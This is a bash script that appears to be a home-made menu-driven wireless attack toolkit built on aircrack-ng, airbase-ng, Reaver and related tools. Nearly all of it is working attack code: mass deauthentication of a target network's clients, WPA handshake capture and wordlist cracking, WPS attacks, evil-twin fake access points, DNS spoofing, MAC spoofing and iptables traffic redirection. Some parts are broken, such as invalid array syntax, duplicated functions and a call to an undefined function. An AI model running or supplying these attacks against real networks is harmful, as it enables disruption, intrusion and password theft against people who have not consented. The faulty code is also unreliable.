#!/bin/bash

# Check if script is running with sudo
if [[ $EUID -ne 0 ]]; then
    echo "This script needs root privileges. Restarting with sudo..."
    exec sudo "$0" "$@"
fi

# Convert the script to Unix format (if needed)
dos2unix "$0"

# Make the script executable
chmod +x "$0"

# Function to start the script over
restart_script() {
    exec "$0" "$@"
}


# Start the script with sudo automatically
if [[ $EUID -ne 0 ]]; then
    echo "This script needs root privileges. Restarting with sudo..."
    exec sudo "$0" "$@"
fi


# Function to set up Evil Twin with SSID pool
ssid_pool() {
    # Ask the user to choose between wlan0 and wlan0mon
    read -p "Enter your wireless adapter name (e.g., wlan0 or wlan0mon): " wireless_adapter

    # Ensure the chosen adapter is in monitor mode
    sudo airmon-ng check kill
    sudo airmon-ng start "$wireless_adapter"

    # Function to terminate background processes on script exit
    cleanup() {
        echo "Cleaning up..."
        pkill -f "sudo airbase-ng"
    }

    # Trap the script exit to perform cleanup
    trap cleanup EXIT

    # Randomly select an SSID from the pool
    random_index=$((RANDOM % 5))
    evil_ssid=("Free WiFi" "CoffeeShop Guest" "Public Hotspot" "Secure Network" "TechConference")[$random_index]

    # Randomly select a channel (1-11) for the Fake AP
    evil_channel=$((RANDOM % 11 + 1))

    # Set up Evil Twin access point with an open security mode
    sudo airbase-ng -e "$evil_ssid" -c "$evil_channel" -a "$target_bssid" "$wireless_adapter" &

    # Add a delay to allow time for the attack to take effect
    sleep 5

    # Check if the Evil Twin network is visible
    if sudo iw dev "$wireless_adapter" scan | grep -q "$evil_ssid"; then
        echo "Evil Twin network '$evil_ssid' created successfully with channel $evil_channel and open security mode."
    else
        echo "Error: Evil Twin network creation failed. Retrying..."

        # Retry Evil Twin creation
        sudo airmon-ng stop "$wireless_adapter"
        sudo airmon-ng start "$wireless_adapter"

        # Check if the Evil Twin network is visible after retry
        if sudo iw dev "$wireless_adapter" scan | grep -q "$evil_ssid"; then
            echo "Evil Twin network '$evil_ssid' created successfully after retry with channel $evil_channel and open security mode."
        else
            echo "Error: Evil Twin network creation failed after retry."
        fi
    fi
}












# Function to display network information
display_network_info() {
    echo "Network Information:"
    ip addr
    ip route
    cat /etc/resolv.conf
}

# Function to perform port scanning
port_scanning() {
    read -p "Enter the target IP address for port scanning: " target_ip
    sudo nmap $target_ip
}

# Function to capture a WPA handshake
capture_handshake() {
    read -p "Enter the BSSID of the target network: " target_bssid
    read -p "Enter the channel of the target network: " target_channel
    read -p "Enter the filename to save the handshake capture (e.g., handshake.cap): " handshake_file

    sudo airodump-ng -c $target_channel --bssid $target_bssid -w $handshake_file wlan0
}
# Function to spoof DNS responses
spoof_dns_responses() {
    read -p "Enter the domain to spoof: " fake_domain
    read -p "Enter the IP address to redirect to: " redirect_ip

    # Check if dnsmasq is installed
    if ! command -v dnsmasq &> /dev/null; then
        echo "Error: dnsmasq is not installed. Install it with 'sudo apt-get install dnsmasq'."
        exit 1
    fi

    # Create a temporary dnsmasq configuration file
    temp_conf=$(mktemp)
    echo "address=/$fake_domain/$redirect_ip" > "$temp_conf"

    # Restart dnsmasq to apply the changes
    sudo service dnsmasq restart

    echo "DNS responses for $fake_domain spoofed to $redirect_ip."
    
    # Clean up the temporary configuration file
    rm "$temp_conf"
}

# Function to bypass MAC filtering
bypass_mac_filtering() {
    read -p "Enter the MAC address to spoof: " new_mac
    read -p "Enter the wireless adapter name (e.g., wlan0 or wlan0mon): " wireless_adapter

    # Validate MAC address format
    if [[ ! $new_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid MAC address format. Please use the format XX:XX:XX:XX:XX:XX."
        return
    fi

    # Bring down the interface
    sudo ip link set dev "$wireless_adapter" down

    # Change the MAC address
    sudo ip link set dev "$wireless_adapter" address "$new_mac"

    # Bring the interface back up
    sudo ip link set dev "$wireless_adapter" up

    echo "MAC address spoofed to: $new_mac"
}


# Function to perform Wireless Traffic Analysis
wireless_traffic_analysis() {
    read -p "Enter the filename to save the capture (e.g., capture.pcap): " pcap_file
    sudo tcpdump -i wlan0 -w "$pcap_file"
}

# Function to perform Traffic Redirection
traffic_redirection() {
    read -p "Enter the target IP address for traffic redirection: " target_ip
    read -p "Enter the port for traffic redirection: " target_port
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$target_ip:$target_port"
    echo "Traffic redirection set up for port 80 to $target_ip:$target_port."
}


# Function to perform WPS/WPA2 Attack with Progress Display
wps_wpa2_attack() {
    read -p "Enter the BSSID of the target network: " target_bssid
    read -p "Enter the channel of the target network: " target_channel
    read -p "Enter your wireless adapter name (e.g., wlan0 or wlan0mon): " wireless_adapter

    # Start WPS/WPA2 attack using Reaver
    reaver_command="sudo reaver -i $wireless_adapter -b $target_bssid -c $target_channel"
    eval "$reaver_command" | while IFS= read -r line; do
        # Display progress information
        echo "$line"
    done
}



# Function to perform MAC Spoofing
mac_spoofing() {
    read -p "Enter your wireless adapter name (e.g., wlan0 or wlan0mon): " wireless_adapter
    read -p "Enter the MAC address to spoof: " new_mac

    # Validate MAC address format
    if [[ ! $new_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid MAC address format. Please use the format XX:XX:XX:XX:XX:XX."
        return
    fi

    # Bring down the interface
    sudo ip link set dev "$wireless_adapter" down

    # Change the MAC address
    sudo ip link set dev "$wireless_adapter" address "$new_mac"

    # Bring the interface back up
    sudo ip link set dev "$wireless_adapter" up

    echo "MAC address spoofed to: $new_mac"
}

# Function to start the script over
restart_script() {
    reset_network_adapter  # Reset the network adapter
    exec "$0" "$@"
}

# Function to run tcpdump to capture packets
run_tcpdump() {
    read -p "Enter the filename to save the capture (e.g., capture.pcap): " pcap_file
    sudo tcpdump -i wlan0 -w "$pcap_file"
}


# Function to capture and save the .cap file
capture_and_save() {
    read -p "Enter the folder name for capture files: " folder_name
    read -p "Enter the name for capture files (without extension): " file_name
    mkdir -p "$folder_name"
    capture_file="$folder_name/$file_name"

    # Launch the scanning process in a new terminal tab
    xterm -e "sudo airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file wlan0" &
    sleep 2

    # Deauthenticate clients
    sudo aireplay-ng --deauth 0 -a $target_bssid wlan0

    # Wait for the capture process to complete
    sleep 2

    # Check if wlan0 is on the correct channel
    current_channel=$(iwlist wlan0 channel | grep "Current Frequency" | awk '{print $5}')
    if [[ "$current_channel" != "$target_channel" ]]; then
        echo -e "\e[91m ██  ██  ██████   █████  ██████  ██   ██          ██████  ██████  ██████  ███████ 
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ██  ████ ██   ██ ██      
 ██  ██  ██   ██ ███████ ██████  █████           ██      ██ ██ ██ ██   ██ █████   
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ████  ██ ██   ██ ██      
 ██  ██  ██████  ██   ██ ██   ██ ██   ██ ███████  ██████  ██████  ██████  ███████ 
                                                                                  
                                                                                  
"
        echo "wlan0 is on channel $current_channel, but the AP uses channel $target_channel."
        return
    fi

    # Prompt user for wordlist choice
    wordlist_choice=$(zenity --list --title="Select Wordlist Source" --column="Option" "Use all wordlists from /usr/share/wordlists/" "Specify your own wordlist path")

    if [[ "$wordlist_choice" == "Use all wordlists from /usr/share/wordlists/" ]]; then
        # List available wordlists in /usr/share/wordlists/
        wordlists_dir="/usr/share/wordlists"
        wordlists=($(ls "$wordlists_dir"))

        # Prompt user to choose a wordlist using a popup tab
        selected_wordlist=$(zenity --list --title="Select Wordlist" --column="Wordlist" "${wordlists[@]}")

        if [[ -n "$selected_wordlist" ]]; then
            echo "Using wordlist: $selected_wordlist"
            wordlist="$wordlists_dir/$selected_wordlist"
        else
            echo "Invalid wordlist selection."
            return
        fi
    elif [[ "$wordlist_choice" == "Specify your own wordlist path" ]]; then
        # Prompt user for custom wordlist path using a popup tab
        custom_wordlist=$(zenity --file-selection --title="Select Custom Wordlist" --file-filter="Wordlist files ( *.txt *.lst ) | *.txt *.lst")

        if [[ -f "$custom_wordlist" ]]; then
            echo "Using custom wordlist: $custom_wordlist"
        else
            echo "Custom wordlist not found."
            return
        fi
    else
        echo "Invalid wordlist choice."
        return
    fi

    # Run Aircrack-ng
    last_command="aircrack-ng -w \"$wordlist\" \"$capture_file-01.cap\""
    eval "$last_command"

    # After Aircrack-ng, ask if the user wants to restart the script
    read -p "Do you want to run the script again? (y/n): " restart_choice
    if [[ "$restart_choice" == "y" ]]; then
        restart_script
    else
        echo "Exiting..."
        exit 0
    fi
}

# Function to perform Aircrack
aircrack() {
    aircrack_choice=$(zenity --list --title="Aircrack Options" --column="Option" "Use all wordlists from /usr/share/wordlists/" "Specify your own wordlist path")

    if [[ "$aircrack_choice" == "Use all wordlists from /usr/share/wordlists/" ]]; then
        # List available wordlists in /usr/share/wordlists/
        wordlists_dir="/usr/share/wordlists"
        wordlists=($(ls "$wordlists_dir"))

        # Prompt user to choose a wordlist using a popup tab
        selected_wordlist=$(zenity --list --title="Select Wordlist" --column="Wordlist" "${wordlists[@]}")

        if [[ -n "$selected_wordlist" ]]; then
            echo "Using wordlist: $selected_wordlist"
            wordlist="$wordlists_dir/$selected_wordlist"
        else
            echo "Invalid wordlist selection."
            return
        fi
    elif [[ "$aircrack_choice" == "Specify your own wordlist path" ]]; then
        # Prompt user for custom wordlist path using a popup tab
        custom_wordlist=$(zenity --file-selection --title="Select Custom Wordlist" --file-filter="Wordlist files ( *.txt *.lst ) | *.txt *.lst")

        if [[ -f "$custom_wordlist" ]]; then
            echo "Using custom wordlist: $custom_wordlist"
        else
            echo "Custom wordlist not found."
            return
        fi
    else
        echo "Invalid choice."
        return
    fi

    # Prompt user for the path to the .cap file using a popup tab
    cap_file_path=$(zenity --file-selection --title="Select .cap File" --file-filter="Capture files ( *.cap ) | *.cap")

    # Check if the .cap file exists
    if [[ -f "$cap_file_path" ]]; then
        # Run Aircrack-ng
        aircrack_command="aircrack-ng -w \"$wordlist\" \"$cap_file_path\""
        echo "Running Aircrack-ng..."
        eval "$aircrack_command"
    else
        echo "The specified .cap file does not exist."
    fi
}

# Function to run tcpdump to capture packets
run_tcpdump() {
    read -p "Enter the filename to save the capture (e.g., capture.pcap): " pcap_file
    sudo tcpdump -i wlan0 -w "$pcap_file"
}

# Display the red logo
echo -e "\e[91m ██  ██  ██████   █████  ██████  ██   ██          ██████  ██████  ██████  ███████ 
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ██  ████ ██   ██ ██      
 ██  ██  ██   ██ ███████ ██████  █████           ██      ██ ██ ██ ██   ██ █████   
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ████  ██ ██   ██ ██      
 ██  ██  ██████  ██   ██ ██   ██ ██   ██ ███████  ██████  ██████  ██████  ███████ 
                                                                                  
                                                                                  
"

# Start monitor mode on wlan0
sudo airmon-ng start wlan0


# Kill interfering processes
sudo airmon-ng check kill

# Start airodump-ng to list available networks
sudo airodump-ng wlan0

# Prompt user for target network BSSID and channel
read -p "Enter the BSSID of the target network: " target_bssid
read -p "Enter the channel of the target network: " target_channel

command_history=()

while true; do
    # Display menu with network information (bold)
    echo -e "\e[1mSame Network - BSSID: $target_bssid, Channel: $target_channel\e[0m:"
    echo "1. Deauthenticate all clients"
    echo "2. Deauthenticate one specific client"
    echo "3. Scan the target network"
    echo "4. Deauthenticate clients and save capture file with custom folder and file names"
    echo "5. Restart"
    echo "6. Change Channel (sudo iwconfig wlan0 channel)"
    echo "7. Aircrack - WiFi WPA/WPA2-PSK Cracker"
    echo "8. PUTTY"
    echo "9. Run tcpdump to capture packets"
    echo "10. Launch Wireshark"
    echo "11. Launch Tshark for packet analysis"
    echo "12. Perform MAC Spoofing"
    echo "13. Fake DNS Server"
    echo "14. Sniff Traffic"
    echo "15. Perform WPS/WPA2 Attack"
    echo "16. Wireless Traffic analisys"
    echo "17. Traffic Redirection"
    echo "18. display network info"
    echo "19. Port Scanning"
    echo "20. Spoof DNS Responses"
    echo "21. Capture WPA Handshake" 
    echo "22. ByPass MAC Filtering"
    echo "23. SSID Pool"
    echo "24. Exit"

    # Prompt user for choice
    read -p "Enter your choice: " choice

    case $choice in
        1)
            # Deauthenticate all clients
            sudo aireplay-ng --deauth 0 -a $target_bssid wlan0
            ;;
        2)
            # Deauthenticate a specific client
            read -p "Enter the MAC address of the client to deauthenticate: " client_mac
            sudo aireplay-ng --deauth 0 -a $target_bssid -c $client_mac wlan0
            ;;
        3)
            # Scan the target network
            sudo airodump-ng -c $target_channel --bssid $target_bssid wlan0
            ;;
        4)
            # Deauthenticate clients and save capture file with custom folder and file names
            capture_and_save
            ;;
        5)
            # Restart the script
            restart_script
            ;;
        6)
            # Change Channel using sudo iwconfig wlan0 (channel)
            read -p "Enter the channel you want to set: " channel_to_set
            sudo iwconfig wlan0 channel $channel_to_set
            ;;
        7)
            # Aircrack choice
            aircrack
            ;;
         8)
            # Launch PuTTY if available
            if command -v putty > /dev/null; then
                echo "Launching PuTTY..."
                putty
            else
                echo "PuTTY is not installed. Do you want to install it? (y/n)"
                read install_putty_choice
                if [[ "$install_putty_choice" == "y" ]]; then
                    sudo apt-get update
                    sudo apt-get install putty
                fi
            fi
            ;;
        9)
            # Run tcpdump to capture packets
            run_tcpdump
            ;;
        10)
            # Launch Wireshark
            wireshark
            ;;
        11)
            # Launch Tshark for packet analysis
            read -p "Enter the path to the pcap file for analysis: " pcap_file_path
            tshark -r "$pcap_file_path"
            ;;


        12)
            # Perform MAC Spoofing
            mac_spoofing
            ;;
	    13)
    # Fake DNS Server
    read -p "Enter the domain to spoof: " fake_domain
    read -p "Enter the IP address to redirect to: " redirect_ip

    # Check if dnsmasq is installed
    if ! command -v dnsmasq &> /dev/null; then
        echo "Error: dnsmasq is not installed. Install it with 'sudo apt-get install dnsmasq'."
        exit 1
    fi

    # Create a temporary dnsmasq configuration file
    temp_conf=$(mktemp)
    echo "address=/$fake_domain/$redirect_ip" > "$temp_conf"

    # Restart dnsmasq to apply the changes
    sudo service dnsmasq restart

    echo "Fake DNS Server for $fake_domain started successfully."

    # Clean up the temporary configuration file
    rm "$temp_conf"
    ;;
14)
    # Sniff Traffic
    read -p "Enter the filename to save the captured traffic (e.g., sniffed_traffic.pcap): " pcap_file
    sudo tcpdump -i wlan0 -w "$pcap_file" &
    sniff_pid=$!

    echo "Traffic sniffing started. Capturing packets to $pcap_file."

    # Wait for user to stop sniffing
    read -p "Press Enter to stop sniffing..."
    sudo kill -SIGINT $sniff_pid  # Stop tcpdump

    ;;
 15)
            # Perform WPS/WPA2 Attack
            wps_wpa2_attack
            ;;
16)
            # Wireless Traffic Analysis
            wireless_traffic_analysis
            ;;
        17)
            # Traffic Redirection
            traffic_redirection
            ;;
18)
    display_network_info
    ;;
19)
    port_scanning
    ;;
20)
    spoof_dns_responses
    ;;
21)
    capture_handshake
    ;;
22)
    bypass_mac_filtering
    ;;           
      23)
    # SSID Pool
    ssid_pool
    ;;


        24)
            # Exit
            echo "Exiting..."
            exit 0
            ;;	
        *)
            echo "Invalid choice. Please select a valid option."
            ;;
    esac
done
